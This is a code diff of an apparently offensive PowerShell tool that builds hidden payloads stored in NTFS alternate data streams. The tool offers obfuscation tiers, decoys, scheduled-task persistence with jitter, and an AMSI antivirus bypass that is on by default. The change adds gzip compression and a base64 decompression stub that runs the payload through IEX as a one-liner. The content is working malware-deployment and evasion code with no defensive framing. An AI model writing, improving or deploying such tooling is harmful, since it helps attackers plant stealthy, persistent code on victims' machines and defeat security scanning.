@@ -98,16 +98,16 @@ param(
     [int]$CreateDecoys = 0,
     
     [switch]$Encrypt,
-    [switch]$Randomize,
+    [bool]$Randomize = $false,
 
     # Unified obfuscation level — controls naming, placement, and ZW injection
     [ValidateSet('None', 'Basic', 'Advanced', 'Paranoid')]
     [string]$Obfuscate = 'Advanced',
     
     # Deep placement - resolve path on target at runtime
-    [switch]$UseDeepPlacement,
+    [bool]$UseDeepPlacement = $false,
     # Attach to existing file on target instead of creating new
-    [switch]$AttachToExisting,
+    [bool]$AttachToExisting = $false,
     
     # Multi-instance: deploy N independent copies with unique paths/tasks
     [ValidateRange(1, 20)]
@@ -116,15 +116,18 @@ param(
     [string]$OutputFile = "ads-payload.txt",
     [string]$ManifestDir = "./manifests",
 
+    # Gzip compression before base64 — reduces one-liner size by ~50%
+    [bool]$UseCompression = $true,
+
     # Opt out of AMSI bypass (bypass is ON by default)
     [switch]$NoAmsi
 )
 
 # --- Tier-implied defaults (individual params override) ---
 if ($Obfuscate -in @('Advanced', 'Paranoid')) {
-    if (-not $PSBoundParameters.ContainsKey('UseDeepPlacement')) { $UseDeepPlacement = [switch]::new($true) }
-    if (-not $PSBoundParameters.ContainsKey('AttachToExisting')) { $AttachToExisting = [switch]::new($true) }
-    if (-not $PSBoundParameters.ContainsKey('Randomize')) { $Randomize = [switch]::new($true) }
+    if (-not $PSBoundParameters.ContainsKey('UseDeepPlacement')) { $UseDeepPlacement = $true }
+    if (-not $PSBoundParameters.ContainsKey('AttachToExisting')) { $AttachToExisting = $true }
+    if (-not $PSBoundParameters.ContainsKey('Randomize')) { $Randomize = $true }
 }
 if ($Obfuscate -eq 'Paranoid') {
     if (-not $PSBoundParameters.ContainsKey('ZeroWidthStreams')) { $ZeroWidthStreams = [switch]::new($true) }
@@ -940,10 +943,41 @@ $minimalScript += @"
 Write-Host '[+] Deployment complete' -ForegroundColor Green
 "@
 
-# Base64 encode for one-liner
+# Base64 encode for one-liner (with optional gzip compression)
 Write-Host "[*] Encoding for transport..." -ForegroundColor White
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($minimalScript)
-$encoded = [Convert]::ToBase64String($bytes)
+
+$uncompressedBytes = [System.Text.Encoding]::Unicode.GetBytes($minimalScript)
+$uncompressedSize = $uncompressedBytes.Length
+
+$ratio = $null
+if ($UseCompression) {
+    # Gzip compress the script (UTF-8 for compression efficiency), then wrap in decompression stub
+    $utf8Bytes = [System.Text.Encoding]::UTF8.GetBytes($minimalScript)
+    $ms = [System.IO.MemoryStream]::new()
+    $gz = [System.IO.Compression.GZipStream]::new($ms, [System.IO.Compression.CompressionMode]::Compress)
+    $gz.Write($utf8Bytes, 0, $utf8Bytes.Length)
+    $gz.Close()
+    $compressedB64 = [Convert]::ToBase64String($ms.ToArray())
+    $ms.Close()
+
+    # Decompression stub: decompress gzipped base64 → IEX
+    $wrapperScript = "`$c='$compressedB64';`$ms=[IO.MemoryStream]::new([Convert]::FromBase64String(`$c));`$gz=[IO.Compression.GZipStream]::new(`$ms,[IO.Compression.CompressionMode]::Decompress);`$sr=[IO.StreamReader]::new(`$gz);IEX `$sr.ReadToEnd();`$sr.Close()"
+
+    $compressedEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($wrapperScript))
+    $uncompressedEncoded = [Convert]::ToBase64String($uncompressedBytes)
+
+    # Only use compression if it actually saves space (overhead hurts for tiny payloads)
+    if ($compressedEncoded.Length -lt $uncompressedEncoded.Length) {
+        $encoded = $compressedEncoded
+        $ratio = [Math]::Round(($compressedEncoded.Length / $uncompressedEncoded.Length) * 100, 1)
+        Write-Host "[+] Compression: $($uncompressedEncoded.Length) → $($compressedEncoded.Length) chars ($ratio%)" -ForegroundColor Green
+    } else {
+        $encoded = $uncompressedEncoded
+        Write-Host "[*] Compression skipped (payload too small to benefit)" -ForegroundColor DarkGray
+    }
+} else {
+    $encoded = [Convert]::ToBase64String($uncompressedBytes)
+}
 
 # Save manifest on Linux
 if (-not $PayloadAtDeployment) {
@@ -972,10 +1006,11 @@ if (-not $PayloadAtDeployment) {
         Persistence       = $Persist
         Encrypted         = $Encrypt.IsPresent
         DecoysCount       = $CreateDecoys
-        Randomized        = $Randomize.IsPresent
-        DeepPlacement     = $UseDeepPlacement.IsPresent
-        AttachToExisting  = $AttachToExisting.IsPresent
+        Randomized        = [bool]$Randomize
+        DeepPlacement     = [bool]$UseDeepPlacement
+        AttachToExisting  = [bool]$AttachToExisting
         InstanceCount     = $InstanceCount
+        Compression       = $UseCompression
         AmsiBypass        = (-not $NoAmsi)
         AmsiBypassMethod  = if (-not $NoAmsi) { "XOR Fragment Splitting v2.2.4" } else { "Disabled" }
         PayloadHash       = $payloadHash
@@ -1014,16 +1049,17 @@ CONFIGURATION:
   Trigger: $($Trigger -join '+') + Periodic(${PeriodicMinutes}m) + Jitter(${JitterPercent}%)
   Decoys: $CreateDecoys
   Encryption: $($Encrypt.IsPresent)
-  Randomized: $($Randomize.IsPresent)
-  Deep Placement: $($UseDeepPlacement.IsPresent)
-  Attach to Existing: $($AttachToExisting.IsPresent)
+  Randomized: $Randomize
+  Deep Placement: $UseDeepPlacement
+  Attach to Existing: $AttachToExisting
   Instances: $InstanceCount$(if($InstanceCount -gt 1){" (each gets unique path/stream/task at runtime)"})
+  Compression: $UseCompression
   AMSI Bypass: $(-not $NoAmsi) (XOR Fragment Splitting - Layer A + Layer B)
   Payload Source: $(if ($PayloadFile) { "File: $PayloadFile" } else { "Command-line" })
-  
+
 PAYLOAD SIZE:
   Readable: $($minimalScript.Length) characters
-  Encoded: $($encoded.Length) characters
+  Encoded: $($encoded.Length) characters$(if ($ratio) { "`n  Compression Ratio: $ratio% of uncompressed" })
 
 ╔═══════════════════════════════════════════════════════════╗
 ║ OPTION 1: Base64 Encoded One-Liner (Recommended)         ║
@@ -1095,6 +1131,9 @@ if (-not $PayloadAtDeployment) {
 }
 if ($PayloadFile) {
     Write-Host "✓ Payload loaded from file (shell-safe)" -ForegroundColor Green
+}
+if ($ratio) {
+    Write-Host "✓ Compression: one-liner reduced to $ratio% of uncompressed size" -ForegroundColor Green
 }
 if (-not $NoAmsi) {
     Write-Host "✓ AMSI bypass: XOR Fragment Splitting (Layer A + Layer B)" -ForegroundColor Green
